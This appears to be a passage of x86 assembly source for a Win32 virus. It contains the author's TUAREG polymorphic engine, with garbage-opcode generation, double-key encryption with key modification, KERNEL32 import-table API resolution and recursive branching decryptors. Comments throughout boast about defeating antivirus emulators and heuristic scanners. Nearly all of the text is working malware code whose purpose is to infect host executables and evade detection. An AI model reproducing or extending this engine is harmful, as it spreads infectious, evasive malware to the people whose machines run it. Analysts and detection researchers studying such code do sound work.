                call    Random
                and     al, 3
                jz    @@TwoBytes
                cmp     al, 2
                jb    @@OneByteWithoutRegister
                jz    @@EndGarbage

      @@OneByteWithRegister:
                call    Random
                and     al, 8
                mov     dl, al
                call    SelectARegister
                or      al, dl
                add     al, 40h
                stosb
                jmp   @@EndGarbage

      @@OneByteWithoutRegister:
                call    Random
                and     eax, 07h
                mov     al, byte ptr [ebp+eax+@@OneByteTable]
                stosb
                jmp   @@EndGarbage

@@OneByteTable  db      90h, 0F5h, 0F8h, 0F9h, 0FCh, 0FDh, 0FBh, 90h
;                       NOP, CMC,  CLC,  STC,  CLD,  STD,  STI,  NOP

      @@TwoBytes2:
                test    edi, 1
                jnz   @@EndGarbage
      @@TwoBytes:
                call    SelectARegister
                mov     dl, al
                call    Random
                and     ax, 0738h
                mov     dh, ah
                inc     eax
                call    RandomFlags
                jz    @@TwoBytes_01
                xchg    dh, dl
                add     al, 2
      @@TwoBytes_01:
                shl     dh, 3
                mov     ah, 0C0h
                or      ah, dl
                or      ah, dh
                stosw

      @@EndGarbage:
                mov     [esp+S_EDI], edi
                popad
                ret
ModifyDumbDecryptor endp

KeyModification db      0
KeyModifier     dd      0
EncryptType2    db      0

Addr_Kernel32   dd      0  ; Address of KERNEL32

;; This routine copies dword by dword the indicated frame, and before storing
;; it, it encrypts that dword with the encryption key. There is one control
;; variable (CopyingVirus) that controls whether he have to leave the first
;; 3Ch bytes unencrypted (the little decryptor) and we have to encrypt with
;; two encryption keys instead of one. Cryptanalisys is hard with two decryp-
;; tion keys because the relation from one byte to another doesn't remain
;; constant when you apply XOR+XOR or ADD+XOR or SUB+XOR, as I apply in this
;; virus. If this doesn't avoid anything, maybe next time I'll code two 8 Kb
;; sized decryptors with the TUAREG and with more techniques of encryption (or
;; two encryptions, or position-based decryptions, or things like that :).
EncryptWhileStoring proc
                push    edx
                cmp     byte ptr [ebp+CopyingVirus], 1 ; Virus code?
                jnz   @@Jump_000      ; If not, jump
                mov     edx, 3Ch/4    ; Leave the first 3Ch bytes with only
                                      ; an encryption layer
                jmp   @@Loop_001
    @@Jump_000: xor     edx, edx      ; EDX=0
    @@Loop_001: lodsd
                cmp     byte ptr [ebp+CopyingVirus], 1
                jnz   @@Next2
                or      edx, edx   ; While EDX isn't 0, we only encrypt with
                jz    @@Next1      ; the main encryption key
                dec     edx
                jmp   @@Next2
      @@Next1:  cmp     byte ptr [ebp+EncryptType2], 1
                jb    @@ADD2
                jz    @@SUB2
        @@XOR2: xor     eax, dword ptr [ebp+CryptValue2]
                jmp   @@Next3
        @@ADD2: add     eax, dword ptr [ebp+CryptValue2]
                jmp   @@Next3
        @@SUB2: sub     eax, dword ptr [ebp+CryptValue2]
      @@Next3:  push    eax
                mov     eax, [ebp+CryptValue2]
                cmp     byte ptr [ebp+KeyModification], 1
                jb    @@ModADD
                jz    @@ModSUB
                cmp     byte ptr [ebp+KeyModification], 3
                jb    @@ModXOR
      @@ModROL: rol     eax, 1
                jmp   @@Next4
      @@ModADD: add     eax, [ebp+KeyModifier]
                jmp   @@Next4
      @@ModSUB: sub     eax, [ebp+KeyModifier]
                jmp   @@Next4
      @@ModXOR: xor     eax, [ebp+KeyModifier]
      @@Next4:  mov     [ebp+CryptValue2], eax
                pop     eax
      @@Next2:  cmp   byte ptr [ebp+EncryptType], 1
                jb  @@ADD
                jz  @@SUB
      @@XOR:    xor   eax, dword ptr [ebp+DecryptKey]
                jmp @@Next
      @@ADD:    add   eax, dword ptr [ebp+DecryptKey]
                jmp @@Next
      @@SUB:    sub   eax, dword ptr [ebp+DecryptKey]
      @@Next:   stosd
                dec     ecx
                jnz   @@Loop_001 ; Repeat <ECX> times (I don't use LOOP coz
                pop     edx      ; the jump exceeds 128 bytes :)
                ret
EncryptWhileStoring endp

CopyingVirus    db      0

EncryptType     db      0  ; 0=ADD, 1=SUB, 2=XOR
DecryptKey      dd      0

CalculateAPIsAddresses proc
                ;; ESI=Address of PE header
                pushad
                lea     edi, [ebp+APIInfo+4]
                mov     ecx, 20h
                xor     eax, eax
     @@LoopKK:  mov     [edi], eax
                add     edi, 10h
                loop  @@LoopKK

                mov     byte ptr [ebp+AnyAPIFound], 0
                mov     edi, [esi+80h]
                movzx   ebx, word ptr [esi+06h]
                movzx   edx, word ptr [esi+14h]
                lea     edx, [esi+edx+18h]
      @@Loop01: mov     eax, [edx+0Ch]
                add     eax, [edx+08h]
                cmp     edi, [edx+0Ch]
                jb    @@NextSection
                cmp     edi, eax
                jb    @@SectionFound
     @@NextSection:
                add     edx, 28h
                dec     ebx
                jnz   @@Loop01
                jmp   @@Exit
    @@SectionFound:
                mov     eax, edi
                sub     eax, [edx+0Ch]
                add     eax, [edx+14h]

                ;; EAX=Physical address of import table (relative)
                ;; EDI=Virtual address of import table (relative)

                mov     [ebp+Idata_Phys], eax
                mov     [ebp+Idata_Virt], edi

                mov     edx, [esi+84h]
                mov     ecx, eax
                add     ecx, [ebp+MappingAddress]
                add     edx, ecx
     @@Loop02:  mov     ebx, [ecx+0Ch]
                or      ebx, ebx
                jz    @@Exit
                cmp     ebx, [esi+50h]
                ja    @@Next
                sub     ebx, [ebp+Idata_Virt]
                add     ebx, [ebp+Idata_Phys]
                add     ebx, [ebp+MappingAddress]
                push    edx
                mov     edx, [ebx]
                call    ToLower
                cmp     edx, 'nrek'
                jnz   @@Next2
                mov     edx, [ebx+4]
                call    ToLower
                cmp     edx, '23le'
                jnz   @@Next2
                mov     edx, [ebx+8]
                call    ToLower
                cmp     edx, 'lld.'
                jnz   @@Next2
                pop     edx

                mov     edi, [ecx+10h]
                add     edi, [esi+34h]
                mov     edx, [ecx]
                sub     edx, [ebp+Idata_Virt]
                add     edx, [ebp+Idata_Phys]
                add     edx, [ebp+MappingAddress]

       @@Otro:  mov     eax, [edx]
                or      eax, eax
                js    @@NextFunc      ; Avoid ordinals
                jz    @@Exit
                sub     eax, [ebp+Idata_Virt]
                add     eax, [ebp+Idata_Phys]
                add     eax, [ebp+MappingAddress]
                add     eax, 2
                mov     esi, eax
                xor     eax, eax

    @@LoopAPI:  cmp     byte ptr [esi], 0
                jz    @@NameCalculated
                mov     cl, [esi]
                and     cl, 3
                rol     eax, cl
                xor     al, [esi]
                inc     esi
                jmp   @@LoopAPI
       @@NameCalculated:
                lea     esi, [ebp+APIInfo]
                mov     ecx, 20h
         @@LoopCheckAPI:
                cmp     eax, [esi]
                jz    @@APIFound
                add     esi, 10h
                loop  @@LoopCheckAPI
    @@NextFunc: add     edx, 4
                add     edi, 4
                jmp   @@Otro
    @@APIFound: mov     [esi+4], edi
                mov     byte ptr [ebp+AnyAPIFound], 1
                jmp   @@NextFunc
    @@Next2:    pop     edx
    @@Next:     add     ecx, 14h
                cmp     ecx, edx
                jb    @@Loop02
       @@Exit:  popad
                ret
CalculateAPIsAddresses endp

Idata_Phys      dd      0
Idata_Virt      dd      0

;ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀ;
;––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;----------------------------------------------------------------------------;
;ﬂﬂﬂﬂ€ﬂﬂ  € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂﬂ €ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€     ‹€    ‹ﬂ‹  ‹€ ;
;ﬂﬂ€ € €  € €  € € ‹€ €    €    Tameless   Unpredictable €    ﬁﬂﬁ    › ﬁ ﬁﬂﬁ ;
;  € € €  € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂ  € ﬂ€ Anarchic   Relentless    €      ﬁ   ﬁ ˛ ›  ﬁ ;
;  € € €‹‹€ €  € €  € €‹‹‹ €‹‹€ Encryption Generator     €‹‹‹‹‹ ﬁ ‹‹ › ﬁ ‹ ﬁ ;
;  €‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹€‹ ‹ ﬂ‹ﬂ ‹‹€‹;
;----------------------------------------------------------------------------;
; The name is quite strambotic :), but I had to justify why the engine is    ;
; called "TUAREG". Anyway, the name isn't new, as I'm in this project since  ;
; 1998, yet before making the MeDriPolEn.                                    ;
;                                                                            ;
; This engine features:                                                      ;
;                                                                            ;
; PRIDE - Pseudo-Random Index DEcryption                                     ;
; Branching Technique - Avoids linear execution of the decryption loop       ;
;                                                                            ;
; This two techniques are explained on the article about "Advanced decryption;
; construction" on 29A#5, where they are better explained than they would be ;
; here.                                                                      ;
;                                                                            ;
; Some notes:                                                                ;
; - The subroutines code will be at the end of every branch for every subrou-;
;  tine created in that branch (the engine selects randomly whether call a   ;
;  created existing one or create a new one and call it when inserting code).;
; - The registers have a "touched" flag, which avoids their use before set-  ;
;  ting on them a valid value (thing that sets lots of flags on heuristic    ;
;  scanners). So, when you call SelectARegisterWithInit, it'll look if the   ;
;  register is "touched". If it isn't, before returning it'll made a DoMOV   ;
;  with a random value and it'll set as "touched".                           ;
; - This version is 1.0 after adding calls to the Win32 API (concretely to   ;
;  KERNEL32) but not directly, but to the import table (like a normal app.). ;
; - "Recursivity" is the main word in the making of this engine. Almost      ;
;  every routine is prepared to be called in recursive instances, and with   ;
;  recursivity we make that the generated code become complex as hell. Just  ;
;  look at the code :).                                                      ;
; - The engine is HUGE (more than a half of the virus is this engine), and,  ;
;  corresponding to its size, the decryptor it generates is one of the most  ;
;  complex decryptors ever generated by any existent polymorphic engine. I'm ;
;  not saying it's the best, but sure it's one of the best :).               ;
; - Nothing more, enjoy it as much as I did it coding it!                    ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; EAX=Displacement from the beginning till the virus
; EBX=Virtual address of the beginning of the encrypted part
; ECX=Place where the decryptors must be put
; Size of encrypted part is Virus_Size+Host_Data_Size

Ident_Tuareg    db      0,'[TUAREG v1.01]',0  ; This marks the beginning of
                                              ; the engine
; Help with stack positions (when you do PUSHAD)
S_EAX   equ     1Ch
S_ECX   equ     18h
S_EDX   equ     14h
S_EBX   equ     10h
S_ESP   equ     0Ch
S_EBP   equ     08h
S_ESI   equ     04h
S_EDI   equ     00h

BssSection      dd      0   ; Data-writing sections. Here we can define
Data1Section    dd      0   ; memory variables and all that. The idea is very
Data2Section    dd      0   ; similar to the MeDriPolEn, where I did a table
Data3Section    dd      0   ; with all the free holes in the virus. This time
Data4Section    dd      0   ; I include the .bss section, if it's available.
                         ; Instead of making a table with writable addresses,
                         ; I put here free frames of 256 bytes at least, gi-
                         ; ving a random dword ptr address inside this frames.

ReservedBssAddress dd   0  ; I save this address to avoid making garbage with
                           ; it. This address will be used to make a jump to
                           ; the unencrypted part. Since the jump isn't cons-
                           ; tructed before total decryption, the emulator of
                           ; an antivirus must emulate to reach one of this
                           ; jumps, to see where the decryptor jumps once the
                           ; data is decrypted.

ReservedMemVars_F       db      30h dup (0)
ReservedMemVars_Addr    dd      30h dup (0)


DecryptorBeginAddress   dd      0  ; Physical address of the decryptor
DecryptorVirtualBeginAddress dd 0  ; Virtual address of the decryptor
Distance                dd      0  ; Distance from the virtual begin address
                                   ; of the decryptor to the decrypted data
EncryptedDataBeginAddress dd    0  ; Place where the virtual address of the
                                   ; encrypted virus is stored
Index1Register  db      0     ; Index1 Register
Index2Register  db      0     ; Index2 Register (used for PRIDE)
KeyRegister     db      0     ; Key register (it can be used or not)
BufferRegister  db      0     ; Buffer register, for some operations that
                              ; require a not-modifiable-by-garbage register
CopyOfUsedRegisters     db      4 dup (0) ; Here we save the four registers
                                 ; selected before sometimes, mainly when we
                                 ; construct the jump to the decrypted part
                                 ; and we don't need the register saving any-
                                 ; more. Since we are coding the end of a
                                 ; branch, we have to save them for the coding
                                 ; of the next branches.
Index1Modifier  dd      0   ; This is a random 8-multiple number between 0 and
                            ; Virus_SizePOW2 (look PRIDE formula)
Index2Modifier  dd      0   ; Value between 4 and 7. Since we are going to do
                            ; AND Index2,xxx, being 0 the two last bits of
                            ; xxx, we don't mind the two last bits of the mo-
                            ; difier, since they are going to be anulated.

TuaregFlags     dd      0
BranchIdentifier db     0
AddressOfTuaregStackFrame dd    0

EPAddition      dd      0

;; This flags are individual for each branch, so they aren't general. This
;; allows each branch to have a "unique" behaviour sometimes.
;;
;; Flags:
;; Bit 0: Use key register: 0=YES, 1=NO
;; Bit 1-2: 00=Use buffer register, 01=XOR again Index2, 10=PUSH/POP Index2
;;          11=Reserved, repeat flag obtention
;; Bit 3: 0=No action, 1=Exchange Index1 and Index2 when using one of them
;;       as memory index (avoid one possible algorithmical clue for detection)
;; Bit 4-5: 00=Functional branch code in a subroutine
;; Bit 6-7: 00=Index calculation + decryption in a subroutine
;; Bit 8-9: 00=Decryption in a subroutine
;; Bit 10-11: 00=All index modifications in a subroutine
;; Bit 12-13: 00=Modify index1 in a subroutine
;; Bit 14-15: 00=Mask index1 in a subroutine
;; Bit 16-17: 00=Modify index2 in a subroutine
;; Bit 18-19: 00=Mask index2 in a subroutine
;; Bit 20-31: Reserved for future expansion

;; Information for every branch in the reserved frame of stack:
;; +00: DWORD: Branch flags
;; +04: DWORD: Functional branch code subroutine address (0 if not made)
;; +08: DWORD: Index calculation + decryption subroutine address
;; +0C: DWORD: Decryption subroutine address
;; +10: DWORD: Index modifications subroutine address
;; +14: DWORD: Modification of index1 subroutine address
;; +18: DWORD: Masking of index1 subroutine address
;; +1C: DWORD: Modification of index2 subroutine address
;; +20: DWORD: Masking of index2 subroutine address
;; +24-40: reserved

InitialValue    dd      0  ; This is the initial value of Index2. The decryp-
                           ; tion of the virus body ends when Index2 reaches
                           ; this value again.
;; Begin fun!
Tuareg          proc
                pushad
                sub     esp, 1000h   ; Create stack frame for variables
                mov     [ebp+AddressOfTuaregStackFrame], esp

                mov     [ebp+Distance], eax
                mov     [ebp+DecryptorBeginAddress], ecx
                mov     [ebp+DecryptorVirtualBeginAddress], ebx
                mov     edi, ecx  ; Save entry values and put EDI as the sto-
                                  ; rage address (to use STOSB and all that)
                mov     eax, [ebp+RelocHeader]
                add     eax, [ebp+MappingAddress]
                mov     eax, [eax+0Ch]
                mov     esi, [ebp+PEHeaderAddress]
                add     eax, [esi+34h]
                mov     [ebp+EncryptedDataBeginAddress], eax ; Set the virtual
                                               ; address of the encrypted data

        ; This variables must be set to 0 at the beginning
                xor     eax, eax
                mov     [ebp+JumpsToCompleteNdx], eax
                mov     [ebp+JumpingArrayNdx], eax
                mov     [ebp+CallsLevel1Ndx], eax
                mov     [ebp+CallsLevel2Ndx], eax
                mov     [ebp+CallsLevel3Ndx], eax
                mov     dword ptr [ebp+ArrayOfCalls1Ndx], eax
                mov     dword ptr [ebp+ArrayOfCalls2Ndx], eax
                mov     dword ptr [ebp+ArrayOfCalls3Ndx], eax
                mov     dword ptr [ebp+TouchedRegisters], eax
                mov     dword ptr [ebp+TouchedRegisters+4], eax
                mov     byte ptr [ebp+ImInRandomLoop], al
                mov     byte ptr [ebp+MOVingRecursLevel], al
                mov     byte ptr [ebp+KeyIsInit], al
                mov     byte ptr [ebp+ImInAPI], al
                mov     byte ptr [ebp+FirstAPICall], al

                call    Random
                and     eax, Virus_SizePOW2 - 8
                mov     [ebp+Index1Modifier], eax  ; Set Index1 modifier

                call    Random
                and     eax, 3
                add     eax, 4
                mov     [ebp+Index2Modifier], eax  ; Set Index2 modifier

      ; Initializing of the random generator (to make is slow poly)
                lea     eax, [ebp+offset SystemTimeReceiver]
                push    eax
                call    dword ptr [ebp+RVA_GetSystemTime]
                mov     eax, [ebp+DwordAleatorio1]
                xor     eax, [ebp+DwordAleatorio2]
                mov     [ebp+DwordAleatorio3], eax

      ; Register selection
                mov     dword ptr [ebp+Index1Register], 08080808h
       @@OtherRegister:
                call    SelectARegister
                cmp     byte ptr [ebp+AnyAPIFound], 1
                jnz   @@SelectAllForKey
                cmp     al, 2
                jbe   @@OtherRegister
       @@SelectAllForKey:
                mov     [ebp+KeyRegister], al
                call    SelectARegister
                mov     [ebp+Index1Register], al
                call    SelectARegister
                mov     [ebp+Index2Register], al
                call    SelectARegister
                mov     [ebp+BufferRegister], al
                mov     eax, dword ptr [ebp+Index1Register]
                mov     dword ptr [ebp+CopyOfUsedRegisters], eax ; Save a copy

                cmp     dword ptr [ebp+BssSection], 0
                jz    @@NoBssSection

                call    Random
                and     eax, 7Ch
                add     eax, [ebp+BssSection]
                mov     [ebp+ReservedBssAddress], eax ; Save a .bss address
                jmp   @@NextThing
      @@NoBssSection:
                mov     eax, [ebp+EncryptedDataBeginAddress]
                add     eax, offset SystemTime - offset Inic_Virus
                mov     [ebp+BssSection], eax
                call    Random
                and     eax, 7Ch
                add     eax, [ebp+BssSection]
                mov     [ebp+ReservedBssAddress], eax ; Get it from another
                                                      ; place
      @@NextThing:
                mov     eax, [ebp+EncryptedDataBeginAddress]
                push    eax
                push    eax
                push    eax
                add     eax, offset SystemTime - offset Inic_Virus
                mov     [ebp+Data1Section], eax
                pop     eax
                add     eax, offset Directory1 - offset Inic_Virus
                mov     [ebp+Data2Section], eax
                pop     eax
                add     eax, offset ArrayOfCalls1 - offset Inic_Virus
                mov     [ebp+Data3Section], eax
                pop     eax
                add     eax, offset CallsLevel1 - offset Inic_Virus
                mov     [ebp+Data4Section], eax  ; Set some free frames for
                                                 ; memory reads/writes. Later,
                                          ; the function SelectAnAddress will
                                          ; give an address from one of this
                                          ; frames to read or write freely.
                mov     ecx, 30h
   @@LoopFillMemVars2:
                mov     dword ptr [ebp+4*ecx+ReservedMemVars_Addr-4], 0
                mov     byte ptr [ebp+ecx+ReservedMemVars_F-1], 0
                loop  @@LoopFillMemVars2

                mov     ecx, 30h
   @@LoopFillMemVars:
                call    SelectAnAddressLow
                mov     [ebp+4*ecx+ReservedMemVars_Addr-4], ebx
                loop  @@LoopFillMemVars

                call    Random
                and     eax, Virus_SizePOW2 - 4
                mov     [ebp+InitialValue], eax ; Set initial value of the
                                                ; Index2

    ;; Let's create all the information for every created branch
                mov     esi, [ebp+AddressOfTuaregStackFrame]
                mov     ecx, 10h
          @@LoopGetLocalFlags:
                call    Random              ; Get local flags
                mov     dword ptr [esi], eax
                test    byte ptr [esi], 2
                jz    @@DontRepeatFlag
                test    byte ptr [esi], 4
                jnz   @@LoopGetLocalFlags
          @@DontRepeatFlag:
                push    ecx
                mov     ecx, 8
                xor     eax, eax
          @@LoopFillSubroutineAddresses:
                mov     [esi+4*ecx], eax
                loop  @@LoopFillSubroutineAddresses
                pop     ecx
                add     esi, 40h
                loop  @@LoopGetLocalFlags

                push    dword ptr [ebp+TouchedRegisters]
                push    dword ptr [ebp+TouchedRegisters+4]
                mov     dword ptr [ebp+TouchedRegisters], 01010101h
                mov     dword ptr [ebp+TouchedRegisters+4], 01010101h
                call    PreCreateCALLs
                mov     eax, edi
                sub     eax, [ebp+DecryptorBeginAddress]
                mov     [ebp+EPAddition], eax
                pop     dword ptr [ebp+TouchedRegisters+4]
                pop     dword ptr [ebp+TouchedRegisters]
                                
                call    DoRandomGarbage   ; Make garbage
                call    DoRandomGarbage
                lea     ebx, [ebp+offset SetIndex1Register]
                lea     ecx, [ebp+offset SetIndex2Register]
                lea     edx, [ebp+offset SetKeyRegister]
                lea     esi, [ebp+offset DoRandomGarbage]
                call    RandomCalling     ; Set initial register values
                call    DoRandomGarbage   ; Make garbage
                call    DoRandomGarbage
                call    DoRandomGarbage
                mov     byte ptr [ebp+BifurcationNumber], 0 ; Set bifurcation
                                                ; to 0 (since it's the start)
                mov     byte ptr [ebp+BranchIdentifier], 0

                call    Branching ; Call the mighty function that TUAREG bases
                                  ; its power on :)
                
;; Once we return from Branching, we have a huge monstruous decryptor cons-
;; tructed, with 15 possible addresses to loop and do the same but with diffe-
;; rent addresses and code (or to arrive again to the same place, it's nearly
;; unpredictable (anarchic relentless... :P).
                mov     edx, [ebp+JumpsToCompleteNdx]
                shr     edx, 2   ; EDX=number of jumps to complete
                mov     ecx, [ebp+JumpingArrayNdx]
                shr     ecx, 2   ; ECX=Number of addresses available to jump.
                                 ; I know the value of this registers (EDX=10h
                                 ; and ECX=0Fh), but in the future maybe it'll
                                 ; be random, so I coded it already in this
                                 ; manner.
     @@CompleteJumps:
                dec     edx        ; Have we finished with jumps?
                js    @@Completed  ; Then, exit
                mov     esi, [4*edx+ebp+JumpsToComplete]
                lea     ebx, [esi+4]
       @@OtherJump:
                call    Random      ; Get a random address to jump
                and     eax, 0Fh
                cmp     eax, ecx
                jae   @@OtherJump
                sub     ebx, [4*eax+ebp+JumpingArray] ; Subtract the address
                neg     ebx         ; to jump with the address of the jump
                                    ; itself...
                mov     [esi], ebx  ; ...and complete the jump opcode
                jmp   @@CompleteJumps  ; Repeat

   @@Completed:
                add     esp, 1000h   ; Restore ESP and release stack frame
                popad      ; Finish TUAREG...
                ret        ; ...and return to reality :( :P
Tuareg          endp

;; This function is the branch generator (and it's auto-callable).
Branching       proc
                inc     byte ptr [ebp+BifurcationNumber] ;Increase bifurcation
                cmp     byte ptr [ebp+BifurcationNumber], 5 ; Have we coded
                                                          ; 4 in this stream?
                jz    @@InsertFunctionalCode ; If so, insert decryption code

                mov     eax, [ebp+JumpingArrayNdx]  ; Insert this address into
                mov     [ebp+eax+JumpingArray], edi ; the jumping array. Later
                add     eax, 4                      ; we can jump to here ran-
                mov     [ebp+JumpingArrayNdx], eax  ; domly.

                call    DoRandomGarbage  ; Make garbage
                call    DoRandomGarbage
                call    RandomFlags      ; Make a random comparision with a
                jz    @@Instruct_2       ; random register. We want to jump
                js    @@CMP              ; very randomly, so we select some
                                         ; quite unpredictable jumps like TEST
                                         ; Reg,PowerOf2/J(N)Z NextBranch, and
                                         ; things like that
       @@TEST:  call    Random     ; TEST Reg,PowerOf2
                and     al, 1Fh    ; A power of two has only a bit set in all
                mov     cl, al     ; the number, so we get a random between 0
                mov     edx, 1     ; and 32 and SHL 1 by that number. Since
                shl     edx, cl    ; it's only a bit and we check that bit
                call    SelectARegister ; from a garbage register, it can be
                mov     ah, al     ; set or clear, so we make J(N)Z and we
                or      al, al     ; won't know which branch the execution is
                jz    @@TEST_EAX   ; going to take.
                mov     al, 0F7h
                or      ah, 0C0h
                stosw
                mov     eax, edx
                stosd
                jmp   @@BitComparision ; Jump to there to set only JZ/JNZ
         @@TEST_EAX:
                mov     al, 0A9h   ; Set TEST EAX,xxx opcode (it's very sus-
                stosb              ; picious to have a TEST EAX with the gene-
                mov     eax, edx   ; ral opcode
                stosd
                jmp   @@BitComparision

       @@CMP:   call    RandomFlags  ; Compare register...
                jz    @@CMP_Reg      ; ...with a register
         @@CMP_Value:                ; or with a value. In this case, the
                call    SelectARegister ; value is random, so the conditional
                cmp     al, 7           ; jump is random too. I avoid the JZ/
                jz    @@CMP_EAX_Value   ; JNZ because they only work when the
                mov     dl, al          ; value is exact. Instead of that, I
                mov     ax, 0F881h      ; use JA, JB, JG, JLE, etc.
                add     ah, dl
                stosw
                jmp   @@CMP_01
         @@CMP_EAX_Value:        ; Set CMP EAX,xxx opcode.
                mov     al, 3Dh
                stosb
      @@CMP_01: call    Random
                stosd
                jmp   @@AbsoluteComparision ; Jump to here to select other 
                                            ; type of jumps, different from 
                                            ; BitComparision
         @@CMP_Reg:
                call    Random       ; Compare with register. It's the same
                and     ax, 0707h    ; as a value, but we set a random regis-
                cmp     ah, al       ; ter, avoiding the same one.
                jz    @@CMP_Reg
                shl     al, 3
                or      ah, al
                or      ah, 0C0h
                mov     al, 39h      ; CMP opcode
                stosw           ; Store instruction
                jmp   @@AbsoluteComparision   ; jump to there

       @@Instruct_2:               ; Another type of random comparision. We
                call    SelectARegister ; do OR Reg,Reg or AND Reg,Reg and
                mov     dl, al          ; we jump with JS/JNS.
                mov     dh, al
                call    RandomFlags
                jz    @@AND
        @@OR:   mov     al, 09h   ; OR opcode
                jmp   @@Inst2_2
        @@AND:  mov     al, 21h   ; AND opcode
     @@Inst2_2: mov     ah, 0C0h ;Set second opcode with "Register mode"
                jc    @@Inst2_3  ; Use random flag (already unchanged)
                add     al, 2   ; Use alternative opcode (since the register
                                ; is the same, we don't care anymore)
     @@Inst2_3: shl     dl, 3   ; Set the selected register to the second op.
                or      ah, dh
                or      ah, dl
                stosw           ; Store instruction
  @@AbsoluteComparision2:
                ; JS, JNS
                xor     ecx, ecx
                call    RandomFlags
                setnz   cl           ; JS, JNS
  @@InsertCJmp: mov     ah, byte ptr [ebp+ecx+Op_CJumps] ; Get the selected
                                                         ; jump from the table
 @@InsertCJmp2: mov     al, 0Fh   ; Since the branches are going to take quite
                stosw             ; more size than 128 bytes, we use 32 bits
                                  ; conditional jumps.
                push    edi    ; Save in stack the address of this jump
                stosd          ; Make space for the displacement of the jump
                               ; (for later calculation)
                jmp   @@NextBranch ; Code next branches (one following this
                                   ; code and another where the jump will jump
                                   ; randomly)
  @@BitComparision:
                xor     ecx, ecx
                call    RandomFlags
                setnz   cl
                add     ecx, 0Ah     ; JZ, JNZ
                jmp   @@InsertCJmp   ; It's clear, I think (it's the same as
                                     ; before)
  @@AbsoluteComparision:   ; CMP
                call    Random    ; Select one of the following conditional
                and     eax, 0Fh  ; jumps:
                cmp     al, 0Ah  ; JS, JNS, JB, JBE, JA, JAE, JG, JL, JGE, JLE
                jae   @@AbsoluteComparision
                mov     ah, byte ptr [ebp+eax+Op_CJumps]
                jmp   @@InsertCJmp2

;; After coding the random-behaviour conditional jump, we arrive here. This
;; code will call recursively the function we are in until the number of bi-
;; furcations in the branch arrives to 5, moment when we'll code the decryp-
;; tion instructions, the index checks and all that.
 @@NextBranch:  call    Branching  ; Code left branch of the jump (the NO-JUMP
                                   ; condition)
                pop     ebx        ; Pop from stack the address where the dis-
                                   ; placement of the jump coded before is.
                mov     ecx, edi   ; Calculate the distance of the jump
                sub     ecx, ebx
                sub     ecx, 4
                mov     [ebx], ecx ; Complete the jump
                call    Branching  ; Calculate the right branch (the JUMP con-
                                   ; dition)
                dec     byte ptr [ebp+BifurcationNumber] ; Decrease the number
                                      ; of bifurcations, since we are going to
                                      ; exit from the function Branching (to
                                      ; return to another run of Branching or
                                      ; return completely to function Tuareg).
                ret   ; Return!

;; When we reach the level 5 of recursivity in this function (Branching), then
;; the "functional code" (decryption instructions, indexes modifications, the
;; loop check and the jump to the decrypted part is inserted, and moreover the
;; code of thesubroutines created until this moment).

@@InsertFunctionalCode:
                movzx   eax, byte ptr [ebp+BranchIdentifier]
                shl     eax, 6 ; *40h
                add     eax, dword ptr [ebp+AddressOfTuaregStackFrame]
                mov     [ebp+TuaregFlags], eax

                dec     byte ptr [ebp+BifurcationNumber] ; Decrease the recur-
                                             ; sivity level for the returning
                call    DoRandomGarbage  ; Make garbage
                call    DoRandomGarbage
                call    DoRandomGarbage
                test    byte ptr [ebp+TuaregFlags], 6 ;Use of buffer register?
                                                      ;(bits 1-2=00)
                jnz   @@NoBufferReg      ; If not, jump
       ;; With buffer register
                xor     edx, edx
                mov     dl, [ebp+BufferRegister] ; Get buffer register in DL
                mov     byte ptr [ebp+edx+TouchedRegisters], 1 ; Set it as
                                                               ; "touched"
                test    byte ptr [ebp+TuaregFlags], 8 ; Exchange Index1 and 2?
                jnz   @@XchgNdxs1          ; Please do
                mov     dh, [ebp+Index1Register] ; Use Index1 in DH
                jmp   @@IFC_01
   @@XchgNdxs1: mov     dh, [ebp+Index2Register] ; Use Index2 in DH
      @@IFC_01: call    DoMOVRegReg        ; Make MOV BufferReg,IndexXReg (or
                call    DoRandomGarbage    ; similar) and some garbage
                call    DoRandomGarbage
                mov     dl, [ebp+BufferRegister] ; DL=Buffer register
                test    byte ptr [ebp+TuaregFlags], 8 ; Exchange Index1 and 2?
                jnz   @@XchgNdxs2          ; Please do
                mov     dh, [ebp+Index2Register] ; Use Index2 in DH
                jmp   @@IFC_02
   @@XchgNdxs2: mov     dh, [ebp+Index1Register] ; Use Index1 in DH
      @@IFC_02: call    DoXORRegReg        ; Do XOR BufferReg,IndexXReg (the
                                           ; IndexX that wasn't used before)
                call    DoRandomGarbage    ; Do garbage
                call    DoRandomGarbage
                call    InsertDecryption   ; Put the decryption instruction
                jmp   @@IFC_Next_02      ; Continue

 @@NoBufferReg: test    byte ptr [ebp+TuaregFlags], 2 ; Which action?
                jnz   @@DoubleXORing       ; Then, double XORing

;; We make: PUSH Index2/XOR Index2,Index1/Decrypt using Index2/POP Index2
      @@PUSHPOPIndex2:
                mov     al, 50h
                add     al, byte ptr [ebp+Index2Register]
                stosb                     ; PUSH Index2
                call    DoRandomGarbage   ; Make garbage
                call    Patch1            ; XOR the Index2 with the Index1 and
                                          ; insert the decryption code, mixed
                                          ; with lots of garbage
                mov     al, 58h
                add     al, byte ptr [ebp+Index2Register]
                stosb                     ; Insert POP Index2
                jmp   @@IFC_Next_02       ; Continue

;; We make: XOR Index2,Index1/Decrypt using Index2/XOR Index2,Index1 (to res-
;;  tore the value)
      @@DoubleXORing:
                call    DoRandomGarbage   ; Make garbage
